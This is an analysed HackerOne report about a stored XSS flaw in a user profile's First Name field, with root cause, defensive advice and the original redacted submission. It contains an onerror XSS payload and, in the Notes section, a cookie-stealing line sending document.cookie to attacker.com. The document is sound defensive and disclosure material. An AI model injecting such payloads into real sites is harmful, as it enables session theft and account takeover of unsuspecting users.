# Stored XSS in User Profile First Name Field

## Metadata
- **Source:** HackerOne
- **Report:** 205626 | https://hackerone.com/reports/205626
- **Submitted:** 2017-02-11
- **Reporter:** hunterahsan
- **Program:** Unknown (Redacted)
- **Bounty:** Not specified
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS) - Stored, Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the user account creation functionality where unsanitized user input in the First Name field is reflected back to authenticated users without proper encoding. An attacker can inject malicious JavaScript code that executes in the context of other users' browsers when they view the attacker's profile or account information.

## Attack scenario
1. Attacker creates an account on the vulnerable application
2. During account setup, attacker injects payload ><img src=x onerror=prompt(1337)> into the First Name field
3. Application stores the malicious payload in the database without sanitization
4. Other users log into the application and navigate to view the attacker's profile or account details
5. The stored XSS payload executes in victims' browsers, demonstrating arbitrary JavaScript execution
6. Attacker could escalate to session hijacking, credential theft, or malware distribution

## Root cause
The application fails to properly validate and encode user-supplied input in the First Name field. Input validation is missing on submission, and output encoding is absent when rendering the stored data to users. The application trusts user input and reflects it directly into the DOM without sanitization.

## Attacker mindset
Opportunistic vulnerability discoverer exploiting common OWASP Top 10 weakness. The attacker demonstrates the vulnerability with a benign proof-of-concept (prompt box) rather than destructive payload, suggesting genuine security research disclosure rather than malicious intent.

## Defensive takeaways
- Implement strict input validation on all user-supplied fields, whitelisting allowed characters for names (alphanumeric, spaces, hyphens)
- Apply proper output encoding (HTML entity encoding) when rendering user data in web context
- Use security-focused templating engines that auto-escape by default
- Implement Content Security Policy (CSP) headers to prevent inline script execution
- Sanitize user input using established libraries (DOMPurify, bleach) if HTML is required
- Apply principle of least privilege - ensure user data fields do not accept HTML/script content
- Implement comprehensive input/output testing in QA and security testing phases
- Use security headers: X-XSS-Protection, X-Content-Type-Options: nosniff

## Variant hunting
Test other user profile fields (Last Name, Bio, About Me, Location) for similar XSS
Check user settings and preference pages for stored XSS in free-text fields
Test comment/review functionality if available
Examine email signature or custom message fields
Check file upload metadata fields that might be displayed
Test search functionality for reflected XSS if user data appears in results
Verify if user-supplied data appears in emails, PDFs, or exported documents
Test for DOM-based XSS in client-side JavaScript processing of profile data

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1566 - Phishing (if used in targeted attacks)
- T1204.001 - User Execution: Malicious Link

## Notes
Report quality is low with heavy redactions and informal presentation, but vulnerability is valid and clearly demonstrated. Researcher could improve disclosure by providing: specific application name, clearer POC with explanation of impact, timeline of disclosure, and steps to reproduce. The vulnerability is straightforward OWASP A03:2021 (Injection) and represents a fundamental security failure in input handling. Prompt(1337) POC is benign but actual exploitation could involve cookie theft (document.location='http://attacker.com/steal?c='+document.cookie), keylogging, or CSRF attacks.

## Full report
<details><summary>Expand</summary>

Hi ███,

This is ███, An Ethical Hacker.

I Have Found Stored XSS In Your Site :)

█████████

Now I Am Going To Show You.

1.Create An Account In Your Site. ███████
2.And Put This Script in First Name.
"><img src=x onerror=prompt(1337)>
3.Save it :)
4.Account Created now Go to this Web ██████████
5.Click On Login.
6.Checkout the Popup ;) XSS Stored popup :)

Checkout Also My POC I Have Explained :)

█████

Please Resolve this Issue,This is Very Critical.

Best Regards,
███
█████████

</details>

---
*Analysed by Claude on 2026-05-12*
